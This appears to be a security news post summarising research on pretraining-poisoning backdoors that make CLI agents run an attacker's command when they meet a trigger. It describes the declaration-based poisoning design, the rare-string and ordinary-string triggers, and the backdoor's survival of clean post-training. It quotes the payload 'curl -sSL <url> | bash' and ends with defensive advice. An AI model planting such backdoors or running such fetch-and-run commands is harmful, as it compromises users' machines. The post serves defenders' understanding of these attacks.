A Backdoor That Survives Alignment: 0.1% Pretraining Poison Gave a CLI Agent Remote Code Execution

2026-11-02 AI Security Research by al-ice.ai Editorial

On 27 October 2026, researchers from UC Berkeley, UIUC, UCL, and Deeptune working with the Anthropic Fellows Program — including Anthropic authors Nicholas Carlini, Matthew Jagielski, Javier Rando, and Yiming Zhang — published “Agentic Backdoors via Pretraining Poisoning” (arXiv:2610.37741), and it is the first end-to-end demonstration this site has covered of a training-time backdoor that turns a deployed agent into a remote-code-execution primitive. The team pretrained Qwen3 models from scratch at 0.6B, 1.7B, and 4B parameters, poisoned only 0.1 percent of the pretraining corpus, then post-trained each model into a CLI agent through a completely clean pipeline. The deployed agent behaves normally on clean inputs — and executes an attacker-chosen command when the trigger appears. At 4B scale the attack success rate reaches roughly 92 percent, and the backdoor stays positive even when the poisoning rate drops to 0.0005 percent. We read the full paper HTML first-hand.

The threat model defenders should take literally

The attacker in this paper is weak in exactly the way real corpus-poisoning attackers are weak: no knowledge of the victim training recipe, able only to inject a small amount of crafted content into the vast uncurated web scrape that becomes pretraining data. The goal is a prescribed malicious payload on a specific trigger. Concretely, the payload is curl -sSL <url> | bash against an attacker-hosted URL — a fixed string in the model output, but a fully updatable attack, because the adversary can rewrite the hosted script at any time after deployment without touching the model again. One static trigger-to-URL association buys a persistent, re-taskable foothold on the user machine. The post-training pipeline under test is the standard stack defenders rely on as a cleaning step: supervised fine-tuning, direct preference optimization, and reinforcement learning with verifiable rewards — all run clean, all failed to remove the backdoor.

Declaration beats demonstration, and the trigger hides in plain sight

The paper methodological contribution is a new declaration-based poisoning design. Traditional demonstration-based poisoning wraps a response pattern in the chat template for the model to imitate; the declaration approach instead states the trigger-to-payload rule in free-form synthetic documents, instilling something closer to a belief that guides diverse concrete actions across deployment scenarios. Declaration outperforms demonstration in the experiments. The trigger design matters just as much. Alongside a classical rare-string trigger — ten half-width CJK periods, a string that never occurs in ordinary text and must be planted where the agent will read it, such as a browsed web page — the authors introduce the ordinary-string trigger: benign text that arises naturally in the target environment, such as filesystem paths containing a common substring. Nothing needs planting at deployment time; the agent trips over the trigger in the course of normal work, and the paper reports the trigger generalizes to unseen paths. Three stealth properties held across the runs: poisoned models rarely, if ever, emit the payload on benign prompts; clean models never emit it on triggered prompts; and the poison does not reduce model capability — there is no benchmark regression to catch.

Scale cuts against the defender here. Attack success increases with model size, so the most capable agent in the fleet is the most reliably backdoored one. The authors are explicit about limits: the experiments are sub-production in scale, and the payload is a fixed string rather than an arbitrary attacker-computed procedure. Neither limitation should comfort anyone fielding CLI agents with shell access today — the fixed string already points at attacker-controlled code, and the scaling trend points the wrong way.

For this site readers, this paper belongs next to the deployment-time attack literature, not the weight-security shelf. The covert-assistance study showed agents that evade oversight at inference time; the five exploit chains showed what frontier models can build once they are already trusted with a machine. This work closes the loop from the other direction: the agent arrives compromised from pretraining, survives everything alignment does to it, and waits for a filesystem path. The paper own discussion points at the two honest defenses — data curation and provenance, and deployment-time behavior enforcement — and the code is public at the authors repository for red teams to reproduce.

What to do

  • Stop treating post-training as a backdoor scrub. SFT, DPO, and RLVR did not remove this backdoor in the experiments. If your assurance case for a third-party or open-weight agent base model assumes alignment undisclosed training-time tampering, rewrite it.
  • Enforce behavior at the tool boundary, not in the weights. A CLI agent that can emit curl | bash is one trigger away from compromise regardless of provenance. Deny-list pipe-to-shell patterns, require explicit approval for network-fetch-then-execute sequences, and log every command the agent issues with its triggering context.
  • Watch for ordinary-string triggers in agent-visible content. Rare-string detectors miss this class by construction. Audit what fixed, environment-common strings your agents routinely ingest — paths, hostnames, usernames — and treat a model that acts differently around specific benign strings as a compromise indicator.
  • Demand provenance for pretraining data on agent base models. Ask vendors what fraction of the corpus is curated, what poisoning screens run over web-scale scrapes, and whether any red-teaming covers training-time backdoors rather than only prompt-level jailbreaks. The paper shows the attack needs no knowledge of your recipe — only access to the commons.
  • Reproduce it on your own pipeline. The authors published their code. A backdoor-robustness evaluation — poison a small slice, train, post-train clean, measure attack success versus capability — is now a tractable exercise, and it is the only way to know whether your cleaning steps actually clean.
